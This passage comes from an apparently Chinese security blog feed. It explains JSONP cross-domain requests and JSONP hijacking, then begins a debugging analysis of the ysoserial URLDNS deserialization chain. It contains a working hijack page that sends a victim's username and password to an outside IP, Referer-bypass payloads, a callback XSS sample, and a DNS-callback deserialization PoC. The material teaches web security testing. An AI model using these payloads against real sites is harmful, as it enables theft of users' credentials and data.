class="string">"http://ajax.googleapis.com/ajax/services/search/web?v=1.0&amp;q=apple&amp;callback=result"</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//自定义的回调函数result</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">result</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//我们就简单的获取apple搜索结果的第一条记录中url数据</span></span><br><span class="line">    alert(data.responseData.results[<span class="number">0</span>].unescapedUrl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>也是同样的逻辑，利用回调函数调用result函数将数据取出，这里<strong>重点解释一下<code>window.onload</code>的作用，在<code>function addScriptTag</code>中的最后一段代码<code>document.body.appendChild(script)</code>，这个<code>script</code>标签是要放到body中的，而我们的js代码是在head中的，此时body还没有初始化完毕，所以需要window.onload先进行初始化页面,当页面一初始化完毕，立刻执行此函数方法。</strong></p>
<p>一些JSONP服务接口</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Digg API：来自 Digg 的头条新闻：</span><br><span class="line"></span><br><span class="line">　　http:<span class="comment">//services.digg.com/stories/top?appkey=http%3A%2F%2Fmashup.com&amp;type=javascript&amp;callback=?</span></span><br><span class="line"></span><br><span class="line">Geonames API：邮编的位置信息：</span><br><span class="line"></span><br><span class="line">　　http:<span class="comment">//www.geonames.org/postalCodeLookupJSON?postalcode=10504&amp;country=US&amp;callback=?</span></span><br><span class="line"></span><br><span class="line">Flickr JSONP API：载入最新猫的图片：</span><br><span class="line"></span><br><span class="line">　　http:<span class="comment">//api.flickr.com/services/feeds/photos_public.gne?tags=cat&amp;tagmode=any&amp;format=json&amp;jsoncallback=?</span></span><br><span class="line"></span><br><span class="line">Yahoo Local Search API：在邮编为 <span class="number">10504</span> 的地区搜索比萨：</span><br><span class="line"></span><br><span class="line">　　http:<span class="comment">//local.yahooapis.com/LocalSearchService/V3/localSearch?appid=YahooDemo&amp;query=pizza&amp;zip=10504&amp;results=2&amp;output=json&amp;callback=</span></span><br></pre></td></tr></table></figure>

<h4 id="jQuery的jsonp实现"><a href="#jQuery的jsonp实现" class="headerlink" title="jQuery的jsonp实现"></a>jQuery的jsonp实现</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;<span class="regexp">/script&gt;  </span></span><br><span class="line"><span class="regexp">$.getJSON("http:/</span><span class="regexp">/xxx/</span>xxx?callback=?<span class="string">",function(data)&#123;        </span></span><br><span class="line"><span class="string">		alert(data.name + "</span> is a a<span class="string">" + data.sex);    </span></span><br><span class="line"><span class="string">	&#125;);</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>url后面必须要添加一个callback参数，这样getJSON方法才会知道是用JSONP方式去访问服务，callback后面的那个问号是内部自动生成的一个回调函数名。类似这个形式<code>jQuery32108394227022163139_1498134481374</code></p>
<p>如果想要自己规定函数名字，可以用以下形式的JSONP调用，实例如下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">            type: <span class="string">"get"</span>,</span><br><span class="line">            url: <span class="string">"http://localhost/xxx/ProcessCallback"</span>, <span class="comment">// 这个就是不同于当前域的一个URL地址，这里单纯演示，所以同域</span></span><br><span class="line">            dataType: <span class="string">"jsonp"</span>,</span><br><span class="line">            jsonp: <span class="string">"jsonpcallback"</span>,  <span class="comment">// 指定回调函数，这里名字可以为其他任意你喜欢的，比如callback，不过必须与下一行的GET参数一致</span></span><br><span class="line">            data: <span class="string">"name=jxq&amp;email=feichexia@yahoo.com.cn&amp;jsonpcallback=?"</span>, <span class="comment">// jsonpcallback与上面的jsonp值一致</span></span><br><span class="line">            success: <span class="function"><span class="keyword">function</span> (<span class="params">json</span>) </span>&#123;</span><br><span class="line">                alert(json.Name);</span><br><span class="line">                alert(json.Email);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">)&#125;;</span><br></pre></td></tr></table></figure>

<p>这样就可以指定自己想要的回调函数名字了。</p>
<h3 id="JSONP劫持"><a href="#JSONP劫持" class="headerlink" title="JSONP劫持"></a>JSONP劫持</h3><p>在上文中已经比较详细的说明了JSONP跨域了，那么下面就来说一下JSONP劫持了，先来一个官方定义</p>
<p>JSON 劫持又为“ JSON Hijacking ”，最开始提出这个概念大概是在 2008 年国外有安全研究人员提到这个 JSONP 带来的风险。其实这个问题属于 CSRF（ Cross-site request forgery 跨站请求伪造）攻击范畴。当某网站听过 JSONP 的方式来快域（一般为子域）传递用户认证后的敏感信息时，攻击者可以构造恶意的 JSONP 调用页面，诱导被攻击者访问来达到截取用户敏感信息的目的。一个典型的 JSON Hijacking 攻击代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wooyun</span>(<span class="params">v</span>)</span>&#123;</span><br><span class="line">    alert(v.username);</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;script src="http:/</span><span class="regexp">/js.login.360.cn/</span>?o=sso&amp;m=info&amp;func=wooyun<span class="string">"&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个是在乌云网上报告的一个攻击例子（ WooYun-2012-11284 ）<a href="http://www.wooyun.org/bug.php?action=view&amp;id=11284" target="_blank" rel="noopener">http://www.wooyun.org/bug.php?action=view&amp;id=11284</a> 当被攻击者在登陆 360 网站的情况下访问了该网页时，那么用户的隐私数据（如用户名，邮箱等）可能被攻击者劫持。<strong>也就是当用户点击此链接，则会触发我们构造wooyun函数，进行返回用户的json数据并且显示出来。</strong></p>
<p>也可以使用jQuery调用jsonp，payload如下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;    </span><br><span class="line">    $.getJSON(<span class="string">"http://xxx/xxx?callback=?"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">getUsers</span>)</span>&#123;</span><br><span class="line">          alert(getUsers.name);</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>模拟场景实战：</p>
<p>test.php(储存着用户的数据)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-type: application/json'</span>);</span><br><span class="line">$jsoncallback = htmlspecialchars($_REQUEST [<span class="string">'callback'</span>]);<span class="comment">//获取回调函数名</span></span><br><span class="line"><span class="comment">//json数据</span></span><br><span class="line"><span class="comment">//$json_data = '["id","user"]';</span></span><br><span class="line">$json_data=<span class="string">'(&#123;"password":"123456","name":"lihuaiqiu"&#125;)'</span>;</span><br><span class="line"><span class="keyword">echo</span> $jsoncallback . <span class="string">"("</span> . $json_data . <span class="string">")"</span>;<span class="comment">//输出jsonp格式的数据</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>json.html恶意链接模仿用户点击</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"demo"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">​        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">callbackFunction</span><span class="params">(result)</span></span></span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> password=result.password;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> username=result.name;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> xhttp;</span></span><br><span class="line"><span class="actionscript">            xhttp = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="actionscript">            xhttp.onreadystatechange = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">             <span class="keyword">if</span> (<span class="keyword">this</span>.readyState == <span class="number">4</span> &amp;&amp; <span class="keyword">this</span>.status == <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="javascript">           <span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML = <span class="keyword">this</span>.responseText;</span></span><br><span class="line">    &#125;&#125;;</span><br><span class="line"><span class="actionscript">    xhttp.open(<span class="string">"GET"</span>,<span class="string">"http://120.77.174.89:12333/?username="</span>+username+<span class="string">"&amp;password="</span>+password,<span class="literal">true</span>);</span></span><br><span class="line">  xhttp.send();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://139.224.236.99/test.php?callback=callbackFunction"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>本地nc监听</p>
<p><img src="https://s2.ax1x.com/2019/07/19/ZxrmsP.png" alt="ZxrmsP.png"></p>
<p>成功拿到数据。</p>
<p>其实如果只是用来漏洞验证的话，完全可以直接写一个回调函数将数据alert出来。</p>
<h4 id="JSONP劫持的挖掘手法"><a href="#JSONP劫持的挖掘手法" class="headerlink" title="JSONP劫持的挖掘手法"></a>JSONP劫持的挖掘手法</h4><p>既然知道的JSONP劫持的作用，该怎么去挖掘这种类型漏洞，这里是在圆圆师傅博客学到的在挖掘微博的JSONP劫持的思路，在他的博客中是以微博为例子的，可能是因为我菜吧…，并没有找到这个接口，于是我在腾讯视频亲爱的热爱的这部电视剧去试着寻找了一下，找到了两处，其中有一处是jQuery的调用，不过都没有敏感信息的涉及，跟着分析一下这两处的调用。</p>
<p>全局搜索callback</p>
<p><img src="https://s2.ax1x.com/2019/07/20/ZzAqTH.png" alt="ZzAqTH.png"></p>
<p>跟进_user0函数</p>
<p><img src="https://s2.ax1x.com/2019/07/20/ZzZOk4.png" alt="ZzZOk4.png"></p>
<p>跟着仔细看一下callback的json数据</p>
<p><img src="https://s2.ax1x.com/2019/07/20/Zzm7oF.png" alt="Zzm7oF.png"></p>
<p>但是这个JSON数据并不涉及一些敏感数据，但是如果我们测试出来了一些敏感信息如(<code>csrf_token,email之类的</code>)的话，接下来就可以换不同的Referer去尝试访问此链接，如果能成的话，就可以构造JSONP劫持去得到敏感信息，如上文的脚本。从这个过程来看，jsonp劫持这个名字似乎起的很恰当，本来应该是正常的网页通过函数回调来取得一些JSON数据进行一些操作，但是在没有安全验证的情况(指Referer一些的验证)，我们可以通过自己构造好的脚本来劫持掉传输的JSON的数据，所以成为JSONP劫持。</p>
<h5 id="referer的绕过手段"><a href="#referer的绕过手段" class="headerlink" title="referer的绕过手段"></a>referer的绕过手段</h5><ul>
<li>正则设置不当，通过购买适当的域名进行绕过</li>
</ul>
<p>对于<a href="http://www.qq.com/login.php?calback=cb，如果referer中的正则检测的只是域名中是否包含qq.com进行过滤，那么我们完全可以通过http://qq.com.hacker.com/hacker.html这种url进行绕过。" target="_blank" rel="noopener">http://www.qq.com/login.php?calback=cb，如果referer中的正则检测的只是域名中是否包含qq.com进行过滤，那么我们完全可以通过http://qq.com.hacker.com/hacker.html这种url进行绕过。</a></p>
<ul>
<li>空referer绕过</li>
</ul>
<p>在很多情况下，开发者在部署过滤 Referer 来源时，忽视了一个空 Referer 的过滤。一般情况下浏览器直接访问某 URL 是不带 Referer 的，所以很多防御部署是允许空 Referer 的。实例如下</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"javascript:'&lt;script&gt;function JSON(o)&#123;alert(o.userinfo.userid);&#125;&lt;/script&gt;&lt;script src=http://www.qq.com/login.php?calback=JSON&gt;&lt;/script&gt;'"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>调用javascript伪协议实现空referer绕过。</p>
<h4 id="自定义回调函数产生Xss漏洞"><a href="#自定义回调函数产生Xss漏洞" class="headerlink" title="自定义回调函数产生Xss漏洞"></a>自定义回调函数产生Xss漏洞</h4><p>对于如下代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$jsoncallback = $_REQUEST [<span class="string">'callback'</span>];<span class="comment">//获取回调函数名</span></span><br><span class="line"><span class="comment">//json数据</span></span><br><span class="line"><span class="comment">//$json_data = '["id","user"]';</span></span><br><span class="line">$json_data=<span class="string">'(&#123;"password":"123456","name":"lihuaiqiu"&#125;)'</span>;</span><br><span class="line"><span class="keyword">echo</span> $jsoncallback . <span class="string">"("</span> . $json_data . <span class="string">")"</span>;<span class="comment">//输出jsonp格式的数据</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可成功通过callback造成xss</p>
<p><img src="https://s2.ax1x.com/2019/07/20/ZzuQHK.png" alt="ZzuQHK.png"></p>
<p>防御手段：可以设置Conten-type为application/json或application/javascript，或者把输入的内容进行实体编码。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>jsonp劫持的思路也就是通过搜索callback之类的关键词，或者cb以及jsoncallback之类的，再次搜索调用的函数名，看一下json数据是否包含敏感的数据，如果包含的话，则可以配合不同referer加绕过过滤的方法验证是否存在，其实最好的方法还是通过脚本是FUZZ，找到的话，可以通过自己构造的脚本进行jsonp敏感信息的劫持，如得到csrf_token,可将漏洞进一步扩大化。</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.k0rz3n.com/2019/03/07/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/#0X04-JSONP-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7" target="_blank" rel="noopener">https://www.k0rz3n.com/2019/03/07/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/#0X04-JSONP-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7</a></p>
<p><a href="https://evoa.me/index.php/archives/43/" target="_blank" rel="noopener">https://evoa.me/index.php/archives/43/</a></p>
<p><a href="http://blog.knownsec.com/2015/03/jsonp_security_technic/" target="_blank" rel="noopener">http://blog.knownsec.com/2015/03/jsonp_security_technic/</a></p>
<p><a href="https://www.cnblogs.com/chopper/archive/2012/03/24/2403945.html" target="_blank" rel="noopener">https://www.cnblogs.com/chopper/archive/2012/03/24/2403945.html</a></p>
]]></content>
      <tags>
        <tag>JSONP</tag>
        <tag>跨域</tag>
        <tag>前端安全</tag>
      </tags>
  </entry>
  <entry>
    <title>ysoserial-调试分析</title>
    <url>/2020/08/09/ysoserial-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本篇文章分析调试的是URLDNS以及CommonCollections系列</p>
<a id="more"></a>

<h3 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h3><p>URLDNS作为ysoserial系列最基础的链，作用还是蛮大的.具体作用如下：</p>
<ol>
<li>判断当前环境是否存在反序列化安全问题</li>
<li>如果payload打失败了，是否有目标机环境中没有Payload中所需要的库或者java版本不对应</li>
</ol>
<h4 id="Gadget-Chain"><a href="#Gadget-Chain" class="headerlink" title="Gadget Chain"></a>Gadget Chain</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Gadget Chain:</span><br><span class="line">  HashMap.readObject()</span><br><span class="line">    HashMap.putVal()</span><br><span class="line">      HashMap.hash()</span><br><span class="line">        URL.hashCode()</span><br></pre></td></tr></table></figure>

<h4 id="示例POC以及分析"><a href="#示例POC以及分析" class="headerlink" title="示例POC以及分析"></a>示例POC以及分析</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> HashMap&lt;URL, String&gt;();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://oehpvo.dnslog.cn"</span>);</span><br><span class="line">        Field f = Class.forName(<span class="string">"java.net.URL"</span>).getDeclaredField(<span class="string">"hashCode"</span>);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(url, <span class="number">2</span>);</span><br><span class="line">        hashMap.put(url, <span class="string">"lih3iu"</span>);</span><br><span class="line">        f.set(url, -<span class="number">1</span>);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"output"</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"output"</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进HashMap.readObject()</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                    K key = (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                    V value = (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟进hash函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将key设置为一个URL对象，调用其对应的hashCode函数，即java.net.URL#hashCode</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">URL</span> <span class="keyword">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">transient</span> URLStreamHandler handler;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Our hash code.</span></span><br><span class="line"><span class="comment">     * @serial</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"> <span class="keyword">private</span> <span class="keyword">int</span> hashCode = -<span class="number">1</span>;   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">        hashCode = handler.hashCode(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到hashCode的值默认是-1，在hashCode函数中如果hashCode为1，则通过handler.hashCode重新计算hashcode，跟进hashCode函数</p>
<p>java.net.URLStreamHandler#hashCode</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the protocol part.</span></span><br><span class="line">        String protocol = u.getProtocol();</span><br><span class="line">        <span class="keyword">if</span> (protocol != <span class="keyword">null</span>)</span><br><span class="line">            h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the host part.</span></span><br><span class="line">        InetAddress addr = getHostAddress(u);</span><br><span class="line">        <span class="keyword">if</span> (addr != <span class="keyword">null</span>) &#123;</span><br><span class="line">            h += addr.hashCode();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String host = u.getHost();</span><br><span class="line">            <span class="keyword">if</span> (host != <span class="keyword">null</span>)</span><br><span class="line">                h += host.toLowerCase().hashCode();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>通过getHostAddress函数获取IP，最终进行DNS请求，并且这里只能传域名，不能传IP，原因如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> InetAddress[] getAllByName(String host, InetAddress reqAddr)</span><br><span class="line">        <span class="keyword">throws</span> UnknownHostException &#123;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">        <span class="comment">// if host is an IP address, we won't do further lookup</span></span><br><span class="line">        <span class="keyword">if</span> (Character.digit(host.charAt(<span class="number">0</span>), <span class="number">16</span>) != -<span class="number">1</span></span><br><span class="line">            || (host.charAt(<span class="number">0</span>) == <span class="string">':'</span>)) &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] addr = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">int</span> numericZone = -<span class="number">1</span>;</span><br><span class="line">            String ifname = <span class="keyword">null</span>;</span><br><span class="line">            <span class="comment">// see if it is IPv4 address</span></span><br><span class="line">            addr = IPAddressUtil.textToNumericFormatV4(host);</span><br><span class="line">            <span class="keyword">if</span> (addr == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// This is supposed to be an IPv6 literal</span></span><br><span class="line">                <span class="comment">// Check if a numeric or string zone id is present</span></span><br><span class="line">                <span class="keyword">int</span> pos;</span><br><span class="line">                <span class="keyword">if</span> ((pos=host.indexOf (<span class="string">"%"</span>)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    numericZone = checkNumericZone (host);</span><br><span class="line">                    <span class="keyword">if</span> (numericZone == -<span class="number">1</span>) &#123; <span class="comment">/* remainder of string must be an ifname */</span></span><br><span class="line">                        ifname = host.substring (pos+<span class="number">1</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ((addr = IPAddressUtil.textToNumericFormatV6(host)) == <span class="keyword">null</span> &amp;&amp; host.contains(<span class="string">":"</span>)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> UnknownHostException(host + <span class="string">": invalid IPv6 address"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ipv6Expected) &#123;</span><br><span class="line">                <span class="comment">// Means an IPv4 litteral between brackets!</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> UnknownHostException(<span class="string">"["</span>+host+<span class="string">"]"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显这在里面进行了IP的限制，所以我们只能传域名进行dns请求</p>
<h4 id="二次hashcode更改的原因"><a href="#二次hashcode更改的原因" class="headerlink" title="二次hashcode更改的原因"></a>二次hashcode更改的原因</h4><p>在poc中有一段这样的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> HashMap&lt;URL, String&gt;();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://oehpvo.dnslog.cn"</span>);</span><br><span class="line">        Field f = Class.forName(<span class="string">"java.net.URL"</span>).getDeclaredField(<span class="string">"hashCode"</span>);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(url, <span class="number">2</span>);</span><br><span class="line">        hashMap.put(url, <span class="string">"lih3iu"</span>);</span><br><span class="line">        f.set(url, -<span class="number">1</span>);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"output"</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"output"</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有一段两次更改hashCode值的代码，这里解释下原因：</p>
<p>跟进hashMap.put</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再跟进hash函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟到这里其实已经可以发现这正是我们Gadget chain需要用到的步骤，并且在hashcode为-1的时候，会进行一次dns请求，这里为了防止本机与目标机器发送的dns请求混淆，所以先将hashcode设置为一个非-1的数字，put完毕，再设置回来hashcode为-1，然后在反序列化的过程因为hashcode的值为-1,触发dns请求。</p>
<h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>ysoserial作者写的代码都很巧妙，我们可以通过这个project的代码来学到很多姿势</p>
<p>POC如下：</p>
